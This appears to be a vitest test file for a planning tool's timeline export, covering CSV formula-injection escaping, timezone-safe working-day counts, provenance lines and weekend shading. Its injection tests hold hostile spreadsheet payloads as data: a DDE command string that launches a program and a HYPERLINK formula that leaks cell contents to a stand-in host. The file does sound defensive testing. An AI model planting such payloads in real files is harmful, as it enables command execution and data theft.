/**
 * Copyright (c) 2026-present Arribada Initiative and contributors
 * SPDX-License-Identifier: AGPL-3.0-only
 * See the LICENSE file for details.
 *
 * The two things a timeline export has to get right and used not to.
 *
 * A value beginning `=`, `+`, `-` or `@` is a FORMULA when the file is opened,
 * and work item names reach this code from GitHub issue titles. `cell()` quoted
 * for commas and did nothing about that.
 *
 * And the file has to be a file of what the reader was looking at. The old CSV
 * carried nine columns, no provenance and no statement of what a folded band had
 * left out, so an export taken from a collapsed view was indistinguishable from
 * one taken from the whole project.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  buildGanttCsv,
  buildGanttSvg,
  buildGanttWorkbook,
  cell,
  describeFilters,
  neutralise,
  provenance,
  workingDays,
  type TExportMeta,
  type TExportRow,
} from "./export";

const DAY = (iso: string) => new Date(`${iso}T00:00:00Z`);

const item = (overrides: Partial<TExportRow> & { id: string; label: string }): TExportRow => ({
  kind: "item",
  start: DAY("2026-08-03"),
  end: DAY("2026-08-07"),
  ...overrides,
});

const META: TExportMeta = { title: "MARLIN", scope: "view" };

describe("formula injection", () => {
  it.each([
    ["=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"],
    ['=HYPERLINK("http://evil.test/?"&A1,"Invoice")', '\'=HYPERLINK("http://evil.test/?"&A1,"Invoice")'],
    ["+1+1", "'+1+1"],
    ["@SUM(A1:A9)", "'@SUM(A1:A9)"],
    ["-- comment out the row", "'-- comment out the row"],
    ["\tleading tab", "'\tleading tab"],
  ])("neutralises %j", (raw, expected) => {
    expect(neutralise(raw)).toBe(expected);
  });

  it("leaves a negative number alone", () => {
    // The budget sheet writes recorded amounts through this same helper. Quoting
    // `-1250.00` would turn a column a funder sums into a column of text, which
    // is why the guard tests for a number rather than prefixing everything.
    expect(neutralise("-1250.00")).toBe("-1250.00");
    expect(neutralise("+3")).toBe("+3");
    expect(neutralise("-1.5e3")).toBe("-1.5e3");
  });

  it("leaves ordinary text alone", () => {
    expect(neutralise("Cold soak at -20 C")).toBe("Cold soak at -20 C");
    expect(neutralise("")).toBe("");
  });

  it("neutralises INSIDE the quotes, not outside them", () => {
    // An apostrophe placed after the RFC-4180 quoting would sit outside the
    // field and read as a stray character rather than as a text marker.
    expect(cell('=cmd,"boom"')).toBe('"\'=cmd,""boom"""');
  });

  it("still quotes a comma, a quote and a newline", () => {
    expect(cell('Test "cold soak", -20 C')).toBe('"Test ""cold soak"", -20 C"');
    expect(cell("two\nlines")).toBe('"two\nlines"');
  });

  it("reaches the CSV itself", () => {
    const csv = buildGanttCsv([item({ id: "1", label: "=1+1" })], META);
    expect(csv).toContain("'=1+1");
    expect(csv).not.toMatch(/,=1\+1/);
  });
});

describe("working days", () => {
  it("counts Mon–Fri inclusive", () => {
    expect(workingDays(DAY("2026-08-03"), DAY("2026-08-07"))).toBe(5); // Mon–Fri
    expect(workingDays(DAY("2026-08-03"), DAY("2026-08-09"))).toBe(5); // + the weekend
    expect(workingDays(DAY("2026-08-03"), DAY("2026-08-10"))).toBe(6);
    expect(workingDays(DAY("2026-08-08"), DAY("2026-08-09"))).toBe(0); // Sat–Sun
    expect(workingDays(DAY("2026-08-03"), DAY("2026-08-03"))).toBe(1);
  });

  it("is zero when the end is before the start", () => {
    expect(workingDays(DAY("2026-08-07"), DAY("2026-08-03"))).toBe(0);
  });
});

describe("what the file says about itself", () => {
  it("names the folded bands and offers the way to include them", () => {
    const lines = provenance({ ...META, collapsed: 3, groupBy: "Sprint" }, 12);
    expect(lines.join("\n")).toContain("3 collapsed groups are folded shut");
    expect(lines.join("\n")).toContain('Export again with "Everything"');
    expect(lines.join("\n")).toContain("grouped by Sprint");
  });

  it("says nothing about folds when the reader asked for everything", () => {
    const lines = provenance({ ...META, scope: "all", collapsed: 3 }, 40);
    expect(lines.join("\n")).not.toContain("folded shut");
    expect(lines.join("\n")).toContain("ignoring what was folded or filtered");
  });

  it("names what is NOT in the file", () => {
    const lines = provenance({ ...META, omissions: ["recorded effort in days"] }, 1);
    expect(lines.join("\n")).toContain("Not in this file: recorded effort in days");
  });

  it("leads every line with # so a parser skips it and a spreadsheet shows it", () => {
    for (const line of provenance({ ...META, collapsed: 1, filters: ["1 state selected"] }, 5))
      expect(line.startsWith("# ")).toBe(true);
  });

  it("takes the caller's word for what a row is", () => {
    // The portfolio's rows are projects AND work items; calling them all work
    // items in the first line the reader sees would be wrong by half.
    const lines = provenance({ ...META, rowNoun: "row", collapsedNoun: "project", collapsed: 2 }, 9).join("\n");
    expect(lines).toContain("9 rows");
    expect(lines).toContain("2 collapsed projects are folded shut");
  });
});

describe("describeFilters", () => {
  it("reads a flat condition map", () => {
    expect(describeFilters({ state_id__in: ["a", "b", "c"], priority__in: ["urgent"] })).toEqual([
      "3 states selected",
      "1 priority selected",
    ]);
  });

  it("reads an AND group", () => {
    expect(describeFilters({ and: [{ cycle_id__in: ["s1", "s2"] }, { assignee_id__in: ["u1"] }] })).toEqual([
      "2 sprints selected",
      "1 assignee selected",
    ]);
  });

  it("is empty when nothing is filtered", () => {
    expect(describeFilters({})).toEqual([]);
    expect(describeFilters(undefined)).toEqual([]);
    expect(describeFilters({ state_id__in: [] })).toEqual([]);
  });
});

describe("the spreadsheet is of the view", () => {
  const collapsedView: TExportRow[] = [
    { id: "g1", kind: "group", label: "Firmware", start: null, end: null },
    item({ id: "i1", label: "Bring-up", identifier: "ARB-1", assignees: "Ada, Ben", freeFloat: 2, totalFloat: 4 }),
    // "Mechanical" is folded shut on screen: its header is drawn, its items are not.
    { id: "g2", kind: "group", label: "Mechanical", start: null, end: null },
  ];

  it("emits one row per work item and turns the band into a column", () => {
    const csv = buildGanttCsv(collapsedView, { ...META, collapsed: 1, groupBy: "Module" });
    const body = csv.split("\n").filter((line) => !line.startsWith("#"));

    expect(body[0].startsWith("Group,Key,Name,Project")).toBe(true);
    expect(body).toHaveLength(2); // the header and ONE item — the folded band brought none
    expect(body[1]).toContain("Firmware");
    expect(body[1]).toContain("ARB-1");
    expect(body[1]).toContain("Ada, Ben".replace(",", ",")); // quoted by cell(), asserted below
    expect(csv).toContain('"Ada, Ben"');
    expect(csv).toContain("1 collapsed group is folded shut");
  });

  it("carries free and total float, and the working-day span", () => {
    const csv = buildGanttCsv(collapsedView, META);
    const row = csv.split("\n").find((line) => line.includes("ARB-1")) ?? "";
    const columns = row.split(",");
    // Working days, Calendar days, Free float, Total float — 5 Mon–Fri, 5 calendar.
    expect(columns.slice(-7)).toEqual(["5", "5", "2", "4", "", "", ""]);
  });

  it("builds a workbook with a header row, a provenance sheet and typed dates", () => {
    const sheets = buildGanttWorkbook(collapsedView, { ...META, collapsed: 1 });

    expect(sheets.map((s) => s.name)).toEqual(["Work items", "About this export"]);
    expect(sheets[0].headerRow).toBe(true);
    expect(sheets[0].rows[0][0]).toBe("Group");
    // The dates are Date objects, not strings: that is the whole difference
    // between a spreadsheet somebody can sort and a screenshot of one.
    expect(sheets[0].rows[1][10]).toBeInstanceOf(Date);
    expect(sheets[0].rows[1][12]).toBe(5);
    // The `#` is CSV comment syntax and means nothing in a cell.
    expect(sheets[1].rows.every(([line]) => !String(line).startsWith("#"))).toBe(true);
    expect(sheets[1].rows.flat().join(" ")).toContain("folded shut");
  });

  it("indents a sub-task with spaces, never a tab", () => {
    // A tab leads a field, so `neutralise` would prefix the name with an
    // apostrophe and every nested row would read as quoted text.
    const sheets = buildGanttWorkbook([item({ id: "i2", label: "Sub", depth: 2 })], META);
    expect(sheets[0].rows[1][2]).toBe("    Sub");
  });
});

/* ------------------------------------------------------- the reader's day --- */

/** UTC-7/-8 — where a UTC-midnight Monday is Sunday evening. */
const WEST = "America/Los_Angeles";
/** UTC+12/+13 — where the whole local morning is yesterday in Greenwich. */
const EAST = "Pacific/Auckland";

/**
 * Run a body in a named timezone.
 *
 * Assigning `process.env.TZ` re-arms V8's zone cache — the same mechanism
 * vitest.config.ts uses to give the suite a deliberately WESTERN default. Done
 * per-assertion here as well as per-run in CI, because a test that only ever sees
 * its runner's zone asserts nothing about the readers in the other one, and the
 * western failures below are completely invisible from UTC.
 */
const inZone = <T>(zone: string, body: () => T): T => {
  const previous = process.env.TZ;
  process.env.TZ = zone;
  try {
    return body();
  } finally {
    // `= undefined` would write the STRING "undefined" and leave every test after
    // this one running in UTC — the one offset where none of this reproduces.
    if (previous === undefined) delete process.env.TZ;
    else process.env.TZ = previous;
  }
};

describe("a plan date is a plain day, not an instant", () => {
  it("really does change zone, or nothing below proves anything", () => {
    // The load-bearing assumption of every test in this file. If the assignment
    // ever stopped re-arming V8's cache, the rest would go on passing — in one
    // zone, silently — which is precisely the failure this block exists to catch.
    // the probe this one assertion runs inside two zones; its name only makes sense here.
    // oxlint-disable-next-line unicorn/consistent-function-scoping
    const weekdayOfAUtcMidnightMonday = () => new Date("2026-08-03T00:00:00Z").getDay();
    expect(inZone(WEST, weekdayOfAUtcMidnightMonday)).toBe(0); // Sunday evening in California
    expect(inZone(EAST, weekdayOfAUtcMidnightMonday)).toBe(1); // Monday noon in Auckland
  });

  it("counts a Mon–Fri week as five working days wherever the reader is", () => {
    // 3–7 August 2026 is a Monday to a Friday. `workingDays` used to open with
    // `start.getDay()` — the LOCAL weekday of a UTC-anchored Date — so west of
    // Greenwich it read the week as Sunday to Thursday and answered 4. That number
    // is the "Working days" column of every spreadsheet a funder receives.
    const week = () => workingDays(DAY("2026-08-03"), DAY("2026-08-07"));
    expect(inZone(WEST, week)).toBe(5);
    expect(inZone(EAST, week)).toBe(5);
  });

  it("gives the same count in every zone, including the weeks a clock changes", () => {
    // 8 March 2026 is when the US springs forward and 5 April is when New Zealand
    // falls back: the two weeks where local-time arithmetic gains or loses an hour
    // and a day-count done by division lands between two integers.
    const spans: [string, string, number][] = [
      ["2026-03-09", "2026-03-13", 5], // the week after the US clock change
      ["2026-04-06", "2026-04-10", 5], // the week after the NZ clock change
      ["2026-08-08", "2026-08-09", 0], // a bare weekend is no work at all
      ["2026-08-03", "2026-08-10", 6], // Monday to the following Monday
    ];
    for (const [from, to, expected] of spans) {
      const count = () => workingDays(DAY(from), DAY(to));
      expect(inZone(WEST, count), `${from} → ${to} west of Greenwich`).toBe(expected);
      expect(inZone(EAST, count), `${from} → ${to} east of Greenwich`).toBe(expected);
    }
  });
});

describe("the weekend the picture shades", () => {
  // One bar over a whole week, so the drawn range holds two Saturdays and the
  // padding puts a third weekend day at each edge.
  const rows = [item({ id: "w", label: "Soak test", start: DAY("2026-08-03"), end: DAY("2026-08-09") })];

  /**
   * Where the renderer puts a given day, read off the "Today" line it draws for
   * it. Its OWN ruler, deliberately: a test that recomputed `x()` here would
   * agree with a broken `x()` and prove nothing about which column is which.
   *
   * Anchored on `stroke-width="1.2"` because the legend's own "Today" key is also
   * a dashed red line, at 1.4.
   */
  const columnOf = (day: string): string => {
    const svg = buildGanttSvg(rows, [], { title: "T", today: DAY(day) }) ?? "";
    const line = /<line x1="([\d.]+)"[^>]*stroke="#dc2626" stroke-width="1\.2"/.exec(svg);
    if (!line) throw new Error(`the picture drew no today line for ${day}, so it cannot be used as a ruler`);
    return line[1];
  };

  /** The x of every shaded column. `#f6f7f9` is the weekend fill and nothing else
   *  in the picture wears it. */
  const shadedColumns = (): string[] => {
    const svg = buildGanttSvg(rows, [], { title: "T", today: DAY("2026-08-05") }) ?? "";
    return [...svg.matchAll(/<rect x="([\d.]+)"[^>]*fill="#f6f7f9"\/>/g)].map((match) => match[1]);
  };

  // Read once: `x()` is subtraction between UTC instants and owes nothing to the
  // reader's zone. Only the CHOICE of which columns to shade ever did.
  const saturday = columnOf("2026-08-08");
  const sunday = columnOf("2026-08-09");
  const friday = columnOf("2026-08-07");
  const monday = columnOf("2026-08-10");

  it("shades Saturday and Sunday for a reader west of Greenwich", () => {
    // `day.getDay()` on a UTC-midnight Date answered about the previous evening
    // out here, so the stripes used to land on the SUNDAY and the MONDAY. A
    // reader counting the working days in a bar off the shading got one answer
    // and the "Working days" column beside it gave another.
    const shaded = inZone(WEST, shadedColumns);
    expect(shaded).toContain(saturday);
    expect(shaded).toContain(sunday);
    expect(shaded).not.toContain(friday);
    expect(shaded).not.toContain(monday);
  });

  it("shades exactly the same columns east of Greenwich", () => {
    // The zone that already worked, kept honest: the fix must not have traded one
    // hemisphere for the other.
    expect(inZone(EAST, shadedColumns)).toEqual(inZone(WEST, shadedColumns));
    expect(inZone(EAST, shadedColumns)).toContain(saturday);
  });
});

describe("the stamp a reader reads the file's age off", () => {
  beforeEach(() => {
    // Date only. Nothing in this suite waits on a timer, and faking the whole
    // clock would be a larger promise than these three tests need.
    vi.useFakeTimers({ toFake: ["Date"] });
  });
  afterEach(() => {
    vi.useRealTimers();
  });

  it("names the reader's day west of Greenwich, not Greenwich's", () => {
    // 05:00 UTC on the 13th is ten o'clock the previous evening in California, so
    // `toISOString()` stamped an export the reader made on the 12th as the 13th.
    vi.setSystemTime(new Date("2026-08-13T05:00:00Z"));
    expect(inZone(WEST, () => provenance(META, 1).join("\n"))).toContain("# Exported 2026-08-12.");
  });

  it("names the reader's day east of Greenwich, not Greenwich's", () => {
    // 20:00 UTC on the 12th is eight in the morning on the 13th in Auckland: the
    // whole local working day was stamped yesterday.
    vi.setSystemTime(new Date("2026-08-12T20:00:00Z"));
    expect(inZone(EAST, () => provenance(META, 1).join("\n"))).toContain("# Exported 2026-08-13.");
  });

  it("dates the picture and the table the same day", () => {
    // The reported shape of this: a PDF saying "prepared 13 Aug" shipping beside a
    // spreadsheet named for the 12th. One notion of today now feeds both.
    vi.setSystemTime(new Date("2026-08-12T20:00:00Z"));
    const [drawn, tabled] = inZone(EAST, () => [
      buildGanttSvg([item({ id: "a", label: "Soak test" })], [], { title: "MARLIN" }) ?? "",
      provenance(META, 1).join("\n"),
    ]);
    expect(drawn).toContain("Generated 2026-08-13 from Arribada Plane");
    expect(tabled).toContain("# Exported 2026-08-13.");
  });
});
